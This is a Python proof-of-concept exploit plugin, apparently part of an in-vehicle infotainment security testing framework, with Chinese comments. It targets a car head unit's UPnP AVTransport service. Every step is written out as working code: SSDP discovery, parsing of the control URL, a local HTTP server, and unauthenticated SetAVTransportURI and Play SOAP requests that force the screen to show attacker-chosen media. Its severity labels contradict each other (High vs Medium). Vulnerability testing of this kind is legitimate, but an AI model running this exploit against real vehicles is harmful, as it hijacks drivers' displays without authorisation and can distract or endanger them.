"""
PoC Name: Mirror Hijack (UPnP AVTransport)
CVE: N/A
Component: Application Stack / UPnP
Category: Application
Severity: High
CVSS: 7.5
Description: 利用 SSDP 发现 IVI 系统的 AVTransport 服务，通过未授权指令强制车机屏幕显示攻击者指定的图片/视频。
Prerequisites: 与目标车机处于同一局域网。
Usage: python3 62_Mirror_Hijack.py <target_ip>
"""
import socket
import requests
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
import threading
import time
import os
import sys
from http.server import SimpleHTTPRequestHandler, HTTPServer
from iv_plugin_base import IVIVulnerabilityPlugin

class MirrorHijackPlugin(IVIVulnerabilityPlugin):
    """
    Mirror Hijack (UPnP AVTransport) Exploit Plugin
    
    基于用户提供的脚本，实现自动发现、建立本地 HTTP 回连服务
    并发送 SetAVTransportURI + Play 指令。
    """
    meta_poc_name = "Mirror Hijack"
    meta_cve_id = "N/A"
    meta_severity = "Medium"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    
    LOCAL_PORT = 8000
    FILE_NAME = "img.jpg" # 占位符文件名

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "UPnP-Mirror-Hijack"
        self.results["description"] = "通过 UPnP AVTransport 接口强制车机显示图片 (Mirror Hijack)"
        self.httpd = None

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需指定目标 IP")
            return False
        return True

    def _start_http_server(self):
        try:
            class SilentHandler(SimpleHTTPRequestHandler):
                def log_message(self, format, *args): pass
            
            self.httpd = HTTPServer(("0.0.0.0", self.LOCAL_PORT), SilentHandler)
            self.logger.info(f"[HTTP] 本地服务器已启动，端口 {self.LOCAL_PORT}")
            t = threading.Thread(target=self.httpd.serve_forever, daemon=True)
            t.start()
            return True
        except Exception as e:
            self.logger.error(f"启动本地 HTTP 服务器失败: {e}")
            return False

    def _discover_location(self):
        msg = "\r\n".join([
            'M-SEARCH * HTTP/1.1',
            'HOST: 239.255.255.250:1900',
            'MAN: "ssdp:discover"',
            'MX: 2',
            'ST: urn:schemas-upnp-org:service:AVTransport:1',
            '', ''
        ]).encode('utf-8')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        self.logger.info("[1/4] 发送 SSDP 发现请求...")
        
        try:
            sock.sendto(msg, ("239.255.255.250", 1900))
            start_time = time.time()
            while time.time() - start_time < 5:
                try:
                    data, addr = sock.recvfrom(65507)
                    if addr[0] == self.target_ip and b"LOCATION:" in data.upper():
                        for line in data.decode(errors='ignore').split("\r\n"):
                            if line.upper().startswith("LOCATION:"):
                                loc = line.split(":", 1)[1].strip()
                                self.logger.info(f"[+] 发现目标 LOCATION: {loc}")
                                return loc
                except socket.timeout:
                    break
        except Exception as e:
            self.logger.error(f"SSDP 发现异常: {e}")
        finally:
            sock.close()
        return None

    def _get_control_url(self, location_url):
        try:
            resp = requests.get(location_url, timeout=5)
            xml_root = ET.fromstring(resp.content)
            ns = {"urn": "urn:schemas-upnp-org:device-1-0"}
            for service in xml_root.findall(".//urn:service", ns):
                service_type = service.find("urn:serviceType", ns).text
                if "AVTransport" in service_type:
                    control_url = service.find("urn:controlURL", ns).text
                    full_url = urljoin(location_url, control_url)
                    self.logger.info(f"[2/4] 解析控制 URL: {full_url}")
                    return full_url
        except Exception as e:
            self.logger.error(f"解析控制 URL 失败: {e}")
        return None

    def exploit(self):
        # 1. 发现
        location = self._discover_location()
        if not location:
            self.logger.warning("未发现目标 AVTransport 服务")
            return

        # 2. 控制 URL
        ctrl_url = self._get_control_url(location)
        if not ctrl_url:
            return

        # 3. 启动本地服务
        self._start_http_server()
        
        # 获取本机 IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.target_ip, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"

        file_url = f"http://{local_ip}:{self.LOCAL_PORT}/{self.FILE_NAME}"
        self.logger.info(f"[3/4] 构造劫持 URL: {file_url}")

        # 4. SOAP 指令
        headers = {
            "Content-Type": 'text/xml; charset="utf-8"',
        }
        
        # SetAVTransportURI
        set_uri_soap = f"""
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
                <u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
                    <InstanceID>0</InstanceID>
                    <CurrentURI>{file_url}</CurrentURI>
                    <CurrentURIMetaData></CurrentURIMetaData>
                </u:SetAVTransportURI>
            </s:Body>
        </s:Envelope>
        """
        headers["SOAPACTION"] = '"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"'
        r1 = requests.post(ctrl_url, data=set_uri_soap.strip().encode('utf-8'), headers=headers, timeout=5)
        self.logger.info(f"SetAVTransportURI 响应: {r1.status_code}")

        # Play
        play_soap = """
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
                <u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
                    <InstanceID>0</InstanceID>
                    <Speed>1</Speed>
                </u:Play>
            </s:Body>
        </s:Envelope>
        """
        headers["SOAPACTION"] = '"urn:schemas-upnp-org:service:AVTransport:1#Play"'
        r2 = requests.post(ctrl_url, data=play_soap.strip().encode('utf-8'), headers=headers, timeout=5)
        self.logger.info(f"Play 响应: {r2.status_code}")

        # 5. 结论
        if r1.status_code == 200 and r2.status_code == 200:
            self.results["vulnerable"] = True
            self.results["evidence"] = f"Mirror Hijack Success: Forced {self.target_ip} to load {file_url}"
            self.logger.warning("[!] 镜像劫持利用成功！")
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = f"SetURI Status: {r1.status_code}, Play Status: {r2.status_code}"

        if self.httpd:
            self.httpd.shutdown()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 62_Mirror_Hijack.py <target_ip>")
        sys.exit(1)
    plugin = MirrorHijackPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
